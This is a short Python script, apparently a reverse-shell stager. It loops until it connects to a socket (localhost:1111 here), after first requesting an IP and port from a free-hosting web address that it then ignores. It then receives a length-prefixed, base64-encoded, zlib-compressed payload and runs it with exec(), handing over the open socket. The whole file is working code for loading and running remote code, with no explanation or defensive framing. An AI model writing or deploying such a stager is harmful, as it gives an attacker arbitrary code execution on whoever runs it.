import socket,zlib,base64,struct,time,sys,requests
while True:
        try:
                ip = requests.get('https://foofooco.000webhostapp.com/ip')
                port = requests.get('https://foofooco.000webhostapp.com/port')

                s=socket.socket(2,socket.SOCK_STREAM)
                s.connect(('localhost', 1111))
                break
        except:
                time.sleep(3)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
        d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
